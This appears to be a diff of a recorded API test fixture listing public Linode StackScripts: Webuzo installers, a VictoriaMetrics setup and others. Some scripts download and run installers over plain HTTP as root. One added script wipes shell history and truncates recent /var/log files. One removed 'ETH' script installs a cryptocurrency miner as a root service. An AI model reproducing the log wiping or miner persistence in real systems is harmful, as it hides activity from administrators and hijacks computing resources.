       "SiteCake powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2714,8 +2784,8 @@ interactions:
       to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure Joomla
       and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Joomla powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2757,8 +2827,8 @@ interactions:
       here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
       completion of the installation process, access http://your-ip:2004 to configure
       MyBB and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "MyBB powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2799,8 +2869,8 @@ interactions:
       Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure Pebble
       and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Pebble powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2833,7 +2903,71 @@ interactions:
       "", "images": ["linode/gentoo"], "deployments_total": 0, "deployments_active":
       0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05", "updated":
       "2018-01-02T03:04:05", "rev_note": "Initial import", "script": "#!/bin/bash\n\n#
-      It works!", "user_defined_fields": []}, {"id": 9254, "username": "webuzo", "user_gravatar_id":
+      It works!", "user_defined_fields": []}, {"id": 1094693, "username": "santiachinelli",
+      "user_gravatar_id": "5a5ea404116429697319f684006d6b93", "label": "loltest-public",
+      "description": "loltest-public", "ordinal": 0, "logo_url": "", "images": ["any/all"],
+      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
+      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
+      "created, public version", "script": "#!/bin/bash\n# <UDF name=\"hostname\"
+      label=\"Hostname\" />\nsource <ssinclude StackScriptID=\"1\">\nsystem_set_hostname
+      \"$HOSTNAME\"\nexec > >(tee /dev/ttyS0 /var/log/stackscript.log) 2>&1\napt update
+      && apt upgrade -y && apt install -y curl wget net-tools traceroute jq\n# Generate
+      files\nmkdir -p /etc/victoriametrics/single\nmkdir -p /var/lib/victoria-metrics-data\nmkdir
+      -p /var/lib/cloud/scripts/per-instance\n# Create victoriametrics user\ngroupadd
+      -r victoriametrics\nuseradd -g victoriametrics -d /var/lib/victoria-metrics-data
+      -s /sbin/nologin --system victoriametrics\nchown -R victoriametrics:victoriametrics
+      /var/lib/victoria-metrics-data\n# Install VictoriaMetrics Single\nVM_VERSION=`curl
+      -sg \"https://api.github.com/repos/VictoriaMetrics/VictoriaMetrics/tags\" |
+      jq -r ''.[0].name''`\nwget https://github.com/VictoriaMetrics/VictoriaMetrics/releases/download/${VM_VERSION}/victoria-metrics-linux-amd64-${VM_VERSION}.tar.gz  -O
+      /tmp/victoria-metrics.tar.gz\ntar xvf /tmp/victoria-metrics.tar.gz -C /usr/bin\nchmod
+      +x /usr/bin/victoria-metrics-prod\nchown root:root /usr/bin/victoria-metrics-prod\ntouch
+      /etc/victoriametrics/single/scrape.yml\nchown root:root /etc/victoriametrics/single/scrape.yml\ncat
+      <<END >/etc/systemd/system/vmsingle.service\n[Unit]\nDescription=VictoriaMetrics
+      is a fast, cost-effective and scalable monitoring solution and time series database.\n#
+      https://docs.victoriametrics.com\nAfter=network.target\n[Service]\nType=simple\nUser=victoriametrics\nGroup=victoriametrics\nWorkingDirectory=/var/lib/victoria-metrics-data\nStartLimitBurst=5\nStartLimitInterval=0\nRestart=on-failure\nRestartSec=5\nEnvironmentFile=-/etc/victoriametrics/single/victoriametrics.conf\nExecStart=/usr/bin/victoria-metrics-prod
+      \\$ARGS\nExecStop=/bin/kill -s SIGTERM \\$MAINPID\nExecReload=/bin/kill -HUP
+      \\$MAINPID\n# See docs https://docs.victoriametrics.com/Single-server-VictoriaMetrics.html#tuning\nProtectSystem=full\nLimitNOFILE=1048576\nLimitNPROC=1048576\nLimitCORE=infinity\nStandardOutput=syslog\nStandardError=syslog\nSyslogIdentifier=vmsingle\n[Install]\nWantedBy=multi-user.target\nEND\ncat
+      <<END >/etc/victoriametrics/single/victoriametrics.conf\n# See https://docs.victoriametrics.com/Single-server-VictoriaMetrics.html#list-of-command-line-flags
+      to get more information about supported command-line flags\n# \n# If you use
+      IPv6 pleas add \"-enableTCP6\" to args line\nARGS=\"-promscrape.config=/etc/victoriametrics/single/scrape.yml
+      -storageDataPath=/var/lib/victoria-metrics-data -retentionPeriod=12 -httpListenAddr=:8428
+      -graphiteListenAddr=:2003 -opentsdbListenAddr=:4242 -influxListenAddr=:8089
+      -enableTCP6\"\nEND\ncat <<END </etc/victoriametrics/single/scrape.yml\n# Scrape
+      config example\n#\nscrape_configs:\n  - job_name: self_scrape\n    scrape_interval:
+      10s\n    static_configs:\n      - targets: [''127.0.0.1:8428''] \nEND\ncat <<END
+      > /etc/profile.d/victoriametrics_welcome.sh\n#!/bin/sh\n#\nmyip=$(hostname -I
+      | awk ''{print$1}'')\n********************************************************************************
+      \nWelcome to VictoriaMetrics Single.\nTo keep this server secure, the UFW firewall
+      is enabled.\nAll ports are BLOCKED except 22 (SSH), 80 (HTTP), and 443 (HTTPS),
+      8428 (VictoriaMetrics HTTP), 8089 (VictoriaMetrics Influx),\n4242 (VictoriaMetrics
+      OpenTSDB), 2003 (VictoriaMetrics Graphite)\nIn a web browser, you can view:\n
+      * The VictoriaMetrics Quickstart guide: https://kutt.it/1click-quickstart\nOn
+      the server:\n  * The default VictoriaMetrics root is located at /var/lib/victoria-metrics-data\n  *
+      VictoriaMetrics is running on ports: 8428, 8089, 4242, 2003 and they are bound
+      to the local interface.\n********************************************************************************\n  #
+      This image includes version v1.74.0 of VictoriaMetrics. \n  # See Release notes
+      https://github.com/VictoriaMetrics/VictoriaMetrics/releases/tag/v1.70.0\n  #
+      Welcome to VictoriaMetrics droplet!\n  # Website:       https://victoriametrics.com\n  #
+      Documentation: https://docs.victoriametrics.com\n  # VictoriaMetrics Github
+      : https://github.com/VictoriaMetrics/VictoriaMetrics\n  # VictoriaMetrics Slack
+      Community: https://slack.victoriametrics.com\n  # VictoriaMetrics Telegram Community:
+      https://t.me/VictoriaMetrics_en\n  # VictoriaMetrics config:   /etc/victoriametrics/single/victoriametrics.conf\n  #
+      VictoriaMetrics scrape config:   /etc/victoriametrics/single/scrape.yml\n  #
+      VictoriaMetrics UI accessable on:   http://your_droplet_public_ipv4:8428/vmui/\nEND\n#
+      Enable UFW and add some rules to it\nsed -e ''s|DEFAULT_FORWARD_POLICY=.*|DEFAULT_FORWARD_POLICY=\"ACCEPT\"|g''
+      \\\n    -i /etc/default/ufw\nufw allow ssh comment \"SSH port\"\nufw allow http
+      comment \"HTTP port\"\nufw allow https comment \"HTTPS port\"\nufw allow 8428
+      comment \"VictoriaMetrics Single HTTP port\"\nufw allow 8089/tcp comment \"TCP
+      Influx Listen port for VictoriaMetrics\"\nufw allow 8089/udp comment \"UDP Influx
+      Listen port for VictoriaMetrics\"\nufw allow 2003/tcp comment \"TCP Graphite
+      Listen port for VictoriaMetrics\"\nufw allow 2003/udp comment \"UDP Graphite
+      Listen port for VictoriaMetrics\"\nufw allow 4242 comment \"OpenTSDB Listen
+      port for VictoriaMetrics\"\nufw --force enable\n# Cleaning up\nrm -rf /tmp/*
+      /var/tmp/*\nhistory -c\ncat /dev/null > /root/.bash_history\nunset HISTFILE\nfind
+      /var/log -mtime -1 -type f ! -name ''stackscript.log'' -exec truncate -s 0 {}
+      \\;\n# Start VictoriaMetrics\nsystemctl enable vmsingle.service\nsystemctl start
+      vmsingle.service\necho \"Installation complete!\"", "user_defined_fields": [{"name":
+      "hostname", "label": "Hostname"}]}, {"id": 9254, "username": "webuzo", "user_gravatar_id":
       "cf0348f835d60e6d133040f49bb36ec5", "label": "Apache Roller powered by Webuzo",
       "description": "Apache Roller is a full-featured, multi-user and group-blog
       server suitable for blog sites large and small.\r\n\r\nApache Roller is a Java
@@ -2845,8 +2979,8 @@ interactions:
       Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure Apache
       Roller and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Apache Roller powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2892,8 +3026,8 @@ interactions:
       to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure WordPress
       and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "WordPress + Nginx powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2940,8 +3074,8 @@ interactions:
       here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
       completion of the installation process, access http://your-ip:2004 to configure
       Concrete5 and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Concrete5 powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -2986,8 +3120,8 @@ interactions:
       to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure Oxwall
       and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Oxwall powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -3037,8 +3171,8 @@ interactions:
       here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
       completion of the installation process, access http://your-ip:2004 to configure
       qdPM and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "qdPM powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -3065,20 +3199,39 @@ interactions:
       \"Congratulations, qdPM has been successfully installed\"\necho \" \"\necho
       \"You can now configure qdPM and Softaculous Webuzo at the following URL :\"\necho
       \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
-      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 9006, "username":
-      "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5", "label": "Jcow
-      powered by Webuzo", "description": "Jcow is a flexible Social Networking software
-      written in PHP. It can help you to:\r\n\r\n    * Build a social network for
-      your interests and passions.\r\n    * Build a member community for your existing
-      website.\r\n    * Build a social networking site like facebook/myspace/twitter.\r\n\r\n\r\n\t\t\t\r\nWebuzo
+      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 1087021, "username":
+      "semmatweb", "user_gravatar_id": "74d1d68d933159acd4082deafbe5879c", "label":
+      "linode", "description": "dit", "ordinal": 0, "logo_url": "", "images": ["linode/centos7",
+      "linode/debian9", "linode/ubuntu18.04", "linode/debian10", "linode/centos8",
+      "linode/centos-stream8", "linode/almalinux8", "linode/rocky8", "linode/debian11",
+      "linode/centos-stream9", "linode/ubuntu22.04", "linode/almalinux9", "linode/rocky9"],
+      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
+      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
+      "", "script": "#!/bin/bash\n# This block defines the variables the user of the
+      script needs to provide\n# when deploying using this script.\n#\n#\n#<UDF name=\"hostname\"
+      label=\"The hostname for the new Linode.\">\n# HOSTNAME=\n#\n#<UDF name=\"fqdn\"
+      label=\"The new Linode''s Fully Qualified Domain Name\">\n# FQDN=\n\n# This
+      sets the variable $IPADDR to the IP address the new Linode receives.\nIPADDR=$(/sbin/ifconfig
+      eth0 | awk ''/inet / { print $2 }'' | sed ''s/addr://'')\n\n# This updates the
+      packages on the system from the distribution repositories.\napt-get update\napt-get
+      upgrade -y\n\n# This section sets the hostname.\necho $HOSTNAME > /etc/hostname\nhostname
+      -F /etc/hostname\n\n# This section sets the Fully Qualified Domain Name (FQDN)
+      in the hosts file.\necho $IPADDR $FQDN $HOSTNAME >> /etc/hosts", "user_defined_fields":
+      [{"name": "hostname", "label": "The hostname for the new Linode."}, {"name":
+      "fqdn", "label": "The new Linode''s Fully Qualified Domain Name"}]}, {"id":
+      9006, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
+      "label": "Jcow powered by Webuzo", "description": "Jcow is a flexible Social
+      Networking software written in PHP. It can help you to:\r\n\r\n    * Build a
+      social network for your interests and passions.\r\n    * Build a member community
+      for your existing website.\r\n    * Build a social networking site like facebook/myspace/twitter.\r\n\r\n\r\n\t\t\t\r\nWebuzo
       is a Single User Control Panel which helps users deploy Web Apps (WordPress,
       Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
       on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
       here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
       completion of the installation process, access http://your-ip:2004 to configure
       Jcow and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Jcow powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -3110,7 +3263,7 @@ interactions:
       Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 401711, "username":
       "linode", "user_gravatar_id": "9d4d301385af69ceb7ad658aad09c142", "label": "Linux
       GSM  Helper", "description": "Linux GSM One-Click Helper", "ordinal": 0, "logo_url":
-      "assets/linuxgsm.svg", "images": ["linode/debian10", "linode/debian9"], "deployments_total":
+      "assets/linuxgsm.svg", "images": ["linode/debian9", "linode/debian10"], "deployments_total":
       0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
       "updated": "2018-01-02T03:04:05", "rev_note": "", "script": "#!/bin/bash\n\n#
       Linux GSM install\n\nfunction linuxgsm_install {\n\necho Configuring IP address\nIPADDR=`hostname
@@ -3245,8 +3398,8 @@ interactions:
       here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
       completion of the installation process, access http://your-ip:2004 to configure
       CMS Made Simple and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "CMS Made Simple powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -3401,208 +3554,7 @@ interactions:
       fix_page_allocation_error {\n  sysctl vm.min_free_kbytes=16384\n  cat << EOT
       > /etc/sysctl.conf\n\n###################################################################\n#
       Fix for page allocation failure\nvm.min_free_kbytes = 16384\nEOT\n  touch /tmp/restart-rsyslog\n}",
-      "user_defined_fields": []}, {"id": 9009, "username": "webuzo", "user_gravatar_id":
-      "cf0348f835d60e6d133040f49bb36ec5", "label": "MODx powered by Webuzo", "description":
-      "MODx helps you take control of your online content. An Open Source PHP application
-      framework, it frees you to build sites exactly how you want and make them 100%
-      yours. Zero restrictions and fast to build. Super-simple templates in regular
-      HTML/CSS/JS (any lib you want). Registered user systems and a killer community.
-      Welcome to web-building nirvana.\r\n\t\t\t\r\nWebuzo is a Single User Control
-      Panel which helps users deploy Web Apps (WordPress, Joomla, Drupal, etc) or
-      System Apps (Apache, NGINX, PHP, Java, MongoDB, etc) on their virtual machines
-      or in the cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
-      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
-      of the installation process, access http://your-ip:2004 to configure MODx and
-      Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal":
-      0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts", "linode/ubuntu14.04lts",
-      "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
-      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
-      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
-      "MODx powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
-      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
-      Install MODx and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
-      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
-      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
-      etc) on their virtual machines or in the cloud.\n#\n# About MODx :\n#   MODx
-      helps you take control of your online content. \n#   An Open Source PHP application
-      framework, it frees you to build sites exactly how you want and make them 100%
-      yours. #   Zero restrictions and fast to build. Super-simple templates in regular
-      HTML/CSS/JS (any lib you want).\n###########################################################################################################\n\n#
-      Install MODx Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
-      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
-      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
-      \"http://$ip:2004/install.php?prepareinstall=109&license=$1\"\n   \n}\n\n# Install
-      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
-      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
-      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
-      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
-      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
-      MODx and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
-      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
-      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
-      \" Installation Completed \"\necho \"-------------------------------------\"\necho
-      \"Congratulations, MODx has been successfully installed\"\necho \" \"\necho
-      \"You can now configure MODx and Softaculous Webuzo at the following URL :\"\necho
-      \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
-      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 1056306, "username":
-      "Poshumei", "user_gravatar_id": "f08d22196d2e64cd2cc9c03d865d3beb", "label":
-      "ETH", "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu20.04"],
-      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
-      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
-      "", "script": "#!/bin/bash\nsleep 60 ;\nsudo apt update ;\nsudo apt -y install
-      nvidia-driver-450 ; \nsudo touch /etc/systemd/system/script.service ;\nsudo
-      touch /usr/local/bin/script.sh ;\nsudo chmod 777 /etc/systemd/system/script.service
-      ;\nsudo chmod 777 /usr/local/bin/script.sh ;\nsudo echo \"#!/bin/bash\nsleep
-      10 ;\nwget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
-      && tar -xvf t-rex-0.25.12-linux.tar.gz && ./t-rex -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555
-      -u 0x83D84Dc6c238f753fCb15573f55FC5855847050f.worker -p x -w rig0 --no-sni --dns-https-server
-      8.8.8.8\" > /usr/local/bin/script.sh;\n\nsudo echo \"[Unit]\nDescription=Script\nAfter=network.target\n[Service]\nExecStart=/usr/local/bin/script.sh\nType=simple\nRestart=no\nUser=root\nWorkingDirectory=/root\n[Install]\nWantedBy=multi-user.target\"
-      > /etc/systemd/system/script.service;\n\nsudo systemctl daemon-reload;\nsudo
-      systemctl enable script.service;\nsleep 10;\nsudo reboot", "user_defined_fields":
-      []}, {"id": 8242, "username": "clc3123", "user_gravatar_id": "9dd72a7da5f85241e20d45ff374bca88",
-      "label": "precise64-with-multi-user-rvm-installed", "description": "", "ordinal":
-      0, "logo_url": "", "images": [null], "deployments_total": 0, "deployments_active":
-      0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05", "updated":
-      "2018-01-02T03:04:05", "rev_note": "Initial import 20140216", "script": "#!/bin/bash\n\n#
-      <udf name=\"hostname\" label=\"Hostname\" default=\"home\" />\n# HOSTNAME=home\n#
-      <udf name=\"fqdn\" label=\"FQDN\" default=\"home.example.com\" />\n# FQDN=home.chenlichao.com\n#
-      <udf name=\"ip_address\" label=\"IP Address\" default=\"1.2.3.4\" />\n# IP_ADDRESS=\"1.2.3.4\"\n#
-      <udf name=\"time_zone\" label=\"Time Zone\" default=\"Etc/UTC\" />\n# TIME_ZONE=\"Asia/Shanghai\"\n\n#
-      <udf name=\"user_ssh_port\" label=\"Default User SSH Port\" default=\"22\" />\n#
-      USER_SSH_PORT=22\n# <udf name=\"user_name\" label=\"Default User Name\" default=\"username\"
-      />\n# USER_NAME=username\n# <udf name=\"user_password\" label=\"Default User
-      Password\" default=\"username\" />\n# USER_PASSWORD=username\n# <udf name=\"user_pub_key\"
-      label=\"Default User Authorized Pub Key\" default=\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZ5a4st/5p+JH7uxU7h84aedrq9rciqQIWk8RF5Gd835MlvP/eL60mQUbEZ9DbQuTRbHTvNT/HKcZ1GvRfvs7MuEiZcDCaw9qTjoV2Max4eeya4v9n/BBTsQw7gznP7yFa82+5DcH9W+OR/75J1JdzLWz4bw+Rgb/4lym5i6j98x6i6dTOXnCc4uc0t2vrIhqSpxH6cmAoKJtEKKAUQpS8/gGtxVgoOqLTP6jw4HXy+Bi+XTu0C78jSjf6I60fGYd9G4p5ci2iQg7bjnrSGu+2yWHnv35afdNaj8nEp50Ocl4hiMtP9/mcVuN5ffcaxU2hGoKJJodENvyuwaRNRTlX
-      username@gmail.com\" />\n# USER_PUB_KEY=\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZ5a4st/5p+JH7uxU7h84aedrq9rciqQIWk8RF5Gd835MlvP/eL60mQUbEZ9DbQuTRbHTvNT/HKcZ1GvRfvs7MuEiZcDCaw9qTjoV2Max4eeya4v9n/BBTsQw7gznP7yFa82+5DcH9W+OR/75J1JdzLWz4bw+Rgb/4lym5i6j98x6i6dTOXnCc4uc0t2vrIhqSpxH6cmAoKJtEKKAUQpS8/gGtxVgoOqLTP6jw4HXy+Bi+XTu0C78jSjf6I60fGYd9G4p5ci2iQg7bjnrSGu+2yWHnv35afdNaj8nEp50Ocl4hiMtP9/mcVuN5ffcaxU2hGoKJJodENvyuwaRNRTlX
-      username@gmail.com\"\n\n# <udf name=\"rvm_version\" label=\"RVM Specific Version\"
-      default=\"stable\" />\n# RVM_VERSION=\"1.25.15\"\n# <udf name=\"rvm_ruby_version\"
-      label=\"Ruby Specific Version\" default=\"2.0.0\" />\n# RVM_RUBY_VERSION=\"1.9.3\"\n\nshow_msg()\n{\n  echo
-      \">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\"\n  echo \"Start $1\"\n  echo
-      \"<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<\"\n}\n\nshow_msg \"modifying
-      hostname & hosts\"\necho $HOSTNAME > /etc/hostname\necho \"$IP_ADDRESS $FQDN
-      $HOSTNAME\" >> /etc/hosts\nhostname -F /etc/hostname\n\nshow_msg \"apt update
-      & upgrade\"\ncat <<EOF > /etc/apt/sources.list\ndeb http://us.archive.ubuntu.com/ubuntu/
